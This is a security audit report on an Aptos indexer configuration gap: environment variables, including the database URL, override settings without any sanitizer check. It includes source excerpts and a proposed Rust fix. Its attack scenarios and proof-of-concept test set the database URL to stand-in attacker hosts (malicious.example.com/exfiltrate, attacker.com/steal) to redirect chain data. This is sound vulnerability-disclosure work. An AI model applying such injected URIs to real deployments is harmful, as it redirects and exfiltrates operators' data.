# Audit Report

## Title
IndexerConfig Lacks Post-Optimization Validation Allowing Environment Variable Injection and State Corruption

## Summary
The `IndexerConfig::optimize()` function reads and applies environment variables without validation, and `IndexerConfig` lacks a `ConfigSanitizer` implementation entirely. This allows malicious or malformed configuration values to bypass schema validation and potentially corrupt indexer state through database URI manipulation, invalid parameter values, or resource exhaustion.

## Finding Description

The Aptos configuration system has two phases: optimization (via `ConfigOptimizer`) and sanitization (via `ConfigSanitizer`). While `IndexerConfig` implements `ConfigOptimizer`, it completely lacks a `ConfigSanitizer` implementation, creating a validation gap. [1](#0-0) 

The `optimize()` function reads environment variables (`INDEXER_DATABASE_URL`, `GAP_LOOKBACK_VERSIONS`, `STARTING_VERSION`, `PROCESSOR_NAME`) and applies them to the configuration without validating their safety or correctness. Critically, the `postgres_uri` field can be overridden via the `INDEXER_DATABASE_URL` environment variable with no validation of the URI format, target safety, or schema compliance.

The code even contains a TODO comment acknowledging this is incorrect behavior: [2](#0-1) 

When configuration loading occurs, the flow is:
1. YAML deserialization with type validation (serde)
2. `NodeConfig::optimize()` calls all sub-config optimizers including `IndexerConfig::optimize()`
3. `NodeConfig::sanitize()` calls all sub-config sanitizers - **but NOT `IndexerConfig::sanitize()` because it doesn't exist** [3](#0-2) 

Note that line 59 calls `IndexerGrpcConfig::sanitize()` and line 66 calls `InternalIndexerDBConfig::sanitize()`, but there is no call to `IndexerConfig::sanitize()`.

Verification that `IndexerConfig` does not implement `ConfigSanitizer` shows zero implementations exist.

The `postgres_uri` is then used directly to create database connection pools: [4](#0-3) 

The `new_db_pool()` function accepts any string without validation, and diesel will only fail when attempting actual connection at runtime.

**Attack Scenarios:**

1. **Database URI Injection**: An attacker who can control environment variables (via container escape, orchestration misconfiguration, or supply chain attack) sets `INDEXER_DATABASE_URL="postgresql://attacker:pass@malicious.example.com:5432/exfiltrate"`. The indexer connects to the attacker's database instead of the legitimate one, sending all blockchain transaction data to the attacker's server.

2. **Invalid URI Crash**: Setting `INDEXER_DATABASE_URL="not-a-valid-postgresql-uri"` causes the indexer to crash when attempting to parse the URI and create connection pools, resulting in denial of service.

3. **Wrong Database Corruption**: Setting `INDEXER_DATABASE_URL` to point to a different legitimate database with incompatible schema causes the indexer to write data to the wrong location, corrupting state.

4. **Extreme Parameter Values**: While type-parsed, values like `GAP_LOOKBACK_VERSIONS` could be set to extreme values within u64 range that cause resource exhaustion or incorrect behavior when cast to i64. [5](#0-4) 

## Impact Explanation

This vulnerability qualifies as **Medium Severity** per the Aptos bug bounty criteria for the following reasons:

- **State inconsistencies requiring intervention**: Malicious postgres_uri values can cause the indexer to write to wrong databases or connect to attacker-controlled infrastructure, corrupting the indexer's view of blockchain state
- **Limited to indexer subsystem**: This does not affect core consensus, validator operations, or on-chain state - only the off-chain indexer service
- **Potential data exfiltration**: Blockchain transaction data could be sent to attacker-controlled servers
- **Denial of service**: Invalid configurations cause indexer crashes and unavailability

The impact does not reach Critical or High severity because:
- Does not affect consensus safety or liveness
- Does not cause loss of funds or validator set manipulation
- Limited to indexer infrastructure, not core blockchain operations

## Likelihood Explanation

**Likelihood: Low to Medium**

**Prerequisites for exploitation:**
- Attacker must control environment variables for the node process
- Typically requires system-level access, container orchestration control, or node operator privileges

**Realistic attack vectors:**
- Container escape vulnerabilities in Kubernetes/Docker environments
- Misconfigured container orchestration allowing environment variable injection
- Supply chain attacks compromising CI/CD pipelines that set deployment configurations
- Multi-tenant deployment isolation failures
- Insider threats from operators with configuration access

While environment variable control is generally privileged, it is a common attack vector in modern cloud-native deployments where misconfigurations are prevalent.

**Exploitation complexity:** Low - once environment variable control is achieved, the attack is straightforward with no additional bypass mechanisms needed.

## Recommendation

Implement `ConfigSanitizer` for `IndexerConfig` with validation of all critical fields:

```rust
impl ConfigSanitizer for IndexerConfig {
    fn sanitize(
        node_config: &NodeConfig,
        _node_type: NodeType,
        _chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        let sanitizer_name = Self::get_sanitizer_name();
        let indexer_config = &node_config.indexer;
        
        if !indexer_config.enabled {
            return Ok(());
        }
        
        // Validate postgres_uri format and safety
        if let Some(ref uri) = indexer_config.postgres_uri {
            // Validate URI is a valid PostgreSQL connection string
            if let Err(e) = url::Url::parse(uri) {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    format!("Invalid postgres_uri format: {}", e),
                ));
            }
            
            // Additional checks: ensure scheme is postgresql/postgres
            let parsed = url::Url::parse(uri).unwrap();
            if parsed.scheme() != "postgresql" && parsed.scheme() != "postgres" {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "postgres_uri must use postgresql:// or postgres:// scheme".to_string(),
                ));
            }
        }
        
        // Validate numeric bounds
        if let Some(batch_size) = indexer_config.batch_size {
            if batch_size == 0 {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "batch_size cannot be zero".to_string(),
                ));
            }
        }
        
        if let Some(fetch_tasks) = indexer_config.fetch_tasks {
            if fetch_tasks == 0 {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "fetch_tasks cannot be zero".to_string(),
                ));
            }
        }
        
        if let Some(processor_tasks) = indexer_config.processor_tasks {
            if processor_tasks == 0 {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "processor_tasks cannot be zero".to_string(),
                ));
            }
        }
        
        Ok(())
    }
}
```

Then add the sanitizer call to `NodeConfig::sanitize()`:

```rust
impl ConfigSanitizer for NodeConfig {
    fn sanitize(
        node_config: &NodeConfig,
        node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        // ... existing code ...
        IndexerConfig::sanitize(node_config, node_type, chain_id)?;  // ADD THIS LINE
        IndexerGrpcConfig::sanitize(node_config, node_type, chain_id)?;
        // ... rest of sanitizers ...
    }
}
```

Additionally, fix the `optimize()` function to respect user-set values in local config YAML as noted in the TODO comment, following the pattern used by other optimizers.

## Proof of Concept

```rust
#[cfg(test)]
mod test_indexer_config_validation {
    use super::*;
    use crate::config::{NodeConfig, node_config_loader::NodeType};
    use aptos_types::chain_id::ChainId;
    use std::env;

    #[test]
    fn test_malicious_postgres_uri_not_validated() {
        // Set malicious environment variable
        env::set_var("INDEXER_DATABASE_URL", "http://attacker.com/steal");
        
        // Create a valid base config with indexer enabled
        let mut node_config = NodeConfig::default();
        node_config.indexer.enabled = true;
        
        // Run optimization - this will apply the malicious env var
        let local_config = serde_yaml::from_str("{}").unwrap();
        IndexerConfig::optimize(&mut node_config, &local_config, NodeType::ValidatorFullnode, None)
            .expect("Optimization should succeed");
        
        // Verify malicious URI was applied
        assert_eq!(
            node_config.indexer.postgres_uri,
            Some("http://attacker.com/steal".to_string())
        );
        
        // VULNERABILITY: No sanitization occurs - the following would fail if sanitizer existed
        // but currently there is NO ConfigSanitizer implementation for IndexerConfig
        // NodeConfig::sanitize(&node_config, NodeType::ValidatorFullnode, None)
        //     .expect_err("Should reject non-postgresql URI");
        
        env::remove_var("INDEXER_DATABASE_URL");
    }
    
    #[test] 
    fn test_invalid_postgres_uri_causes_runtime_failure() {
        // This test demonstrates that invalid URIs are only caught at runtime,
        // not during config loading/validation
        use crate::database::new_db_pool;
        
        let invalid_uri = "not-a-valid-uri";
        
        // new_db_pool will fail at runtime with diesel error
        let result = new_db_pool(invalid_uri);
        assert!(result.is_err(), "Invalid URI should cause connection pool creation to fail");
        
        // But during config load, this would be accepted without validation
    }
}
```

## Notes

This vulnerability represents a defense-in-depth failure rather than a direct exploit of core blockchain functionality. The indexer subsystem is off-chain infrastructure that does not participate in consensus or state commitment. However, it is critical for ecosystem functionality (dApps, explorers, analytics) and data integrity.

The root cause is incomplete implementation of the config validation framework - while the `ConfigSanitizer` trait exists and is used for other subsystems, `IndexerConfig` was never given a sanitizer implementation. This creates an asymmetry where some configs are validated post-optimization while others are not.

The TODO comment at lines 132-135 explicitly acknowledges the current behavior violates the design principle that user-specified config values should not be overridden by the optimizer, further confirming this is a known design flaw rather than intentional behavior.

### Citations

**File:** config/src/config/indexer_config.rs (L119-200)
```rust
impl ConfigOptimizer for IndexerConfig {
    fn optimize(
        node_config: &mut NodeConfig,
        _local_config_yaml: &Value,
        _node_type: NodeType,
        _chain_id: Option<ChainId>,
    ) -> Result<bool, Error> {
        // If the indexer is not enabled, there's nothing to do
        let indexer_config = &mut node_config.indexer;
        if !indexer_config.enabled {
            return Ok(false);
        }

        // TODO: we really shouldn't be overriding the configs if they are
        // specified in the local node config file. This optimizer should
        // migrate to the pattern used by other optimizers, but for now, we'll
        // just keep the legacy behaviour to avoid breaking anything.

        // Verify and set the postgres uri
        indexer_config.postgres_uri = env_var_or_default(
            INDEXER_DATABASE_URL,
            indexer_config.postgres_uri.clone(),
            Some(format!(
                "Either 'config.indexer.postgres_uri' or '{}' must be set!",
                INDEXER_DATABASE_URL
            )),
        );

        // Verify and set the processor
        indexer_config.processor = env_var_or_default(
            PROCESSOR_NAME,
            indexer_config
                .processor
                .clone()
                .or_else(|| Some("default_processor".to_string())),
            None,
        );

        // Verify and set the starting version
        indexer_config.starting_version = match std::env::var(STARTING_VERSION).ok() {
            None => indexer_config.starting_version,
            Some(starting_version) => match starting_version.parse::<u64>() {
                Ok(version) => Some(version),
                Err(error) => {
                    // This will allow a processor to have STARTING_VERSION undefined when deploying
                    warn!(
                        "Invalid STARTING_VERSION: {}. Error: {:?}. Using {:?} instead.",
                        starting_version, error, indexer_config.starting_version
                    );
                    indexer_config.starting_version
                },
            },
        };

        // Set appropriate defaults
        indexer_config.skip_migrations = indexer_config.skip_migrations.or(Some(false));
        indexer_config.check_chain_id = indexer_config.check_chain_id.or(Some(true));
        indexer_config.batch_size = default_if_zero(
            indexer_config.batch_size.map(|v| v as u64),
            DEFAULT_BATCH_SIZE as u64,
        )
        .map(|v| v as u16);
        indexer_config.fetch_tasks = default_if_zero(
            indexer_config.fetch_tasks.map(|v| v as u64),
            DEFAULT_FETCH_TASKS as u64,
        )
        .map(|v| v as u8);
        indexer_config.processor_tasks = default_if_zero(
            indexer_config.processor_tasks.map(|v| v as u64),
            DEFAULT_PROCESSOR_TASKS as u64,
        )
        .map(|value| value as u8);
        indexer_config.emit_every = indexer_config.emit_every.or(Some(0));
        indexer_config.gap_lookback_versions = env_var_or_default(
            GAP_LOOKBACK_VERSIONS,
            indexer_config.gap_lookback_versions.or(Some(1_500_000)),
            None,
        );

        Ok(true)
    }
}
```

**File:** config/src/config/config_sanitizer.rs (L39-71)
```rust
impl ConfigSanitizer for NodeConfig {
    fn sanitize(
        node_config: &NodeConfig,
        node_type: NodeType,
        chain_id: Option<ChainId>,
    ) -> Result<(), Error> {
        // If config sanitization is disabled, don't do anything!
        if node_config.node_startup.skip_config_sanitizer {
            return Ok(());
        }

        // Sanitize all of the sub-configs
        AdminServiceConfig::sanitize(node_config, node_type, chain_id)?;
        ApiConfig::sanitize(node_config, node_type, chain_id)?;
        BaseConfig::sanitize(node_config, node_type, chain_id)?;
        ConsensusConfig::sanitize(node_config, node_type, chain_id)?;
        DagConsensusConfig::sanitize(node_config, node_type, chain_id)?;
        ExecutionConfig::sanitize(node_config, node_type, chain_id)?;
        sanitize_failpoints_config(node_config, node_type, chain_id)?;
        sanitize_fullnode_network_configs(node_config, node_type, chain_id)?;
        IndexerGrpcConfig::sanitize(node_config, node_type, chain_id)?;
        InspectionServiceConfig::sanitize(node_config, node_type, chain_id)?;
        LoggerConfig::sanitize(node_config, node_type, chain_id)?;
        MempoolConfig::sanitize(node_config, node_type, chain_id)?;
        NetbenchConfig::sanitize(node_config, node_type, chain_id)?;
        StateSyncConfig::sanitize(node_config, node_type, chain_id)?;
        StorageConfig::sanitize(node_config, node_type, chain_id)?;
        InternalIndexerDBConfig::sanitize(node_config, node_type, chain_id)?;
        sanitize_validator_network_config(node_config, node_type, chain_id)?;

        Ok(()) // All configs passed validation
    }
}
```

**File:** crates/indexer/src/database.rs (L59-62)
```rust
pub fn new_db_pool(database_url: &str) -> Result<PgDbPool, PoolError> {
    let manager = ConnectionManager::<PgConnection>::new(database_url);
    PgPool::builder().build(manager).map(Arc::new)
}
```

**File:** crates/indexer/src/runtime.rs (L115-115)
```rust
    let lookback_versions = config.gap_lookback_versions.unwrap() as i64;
```
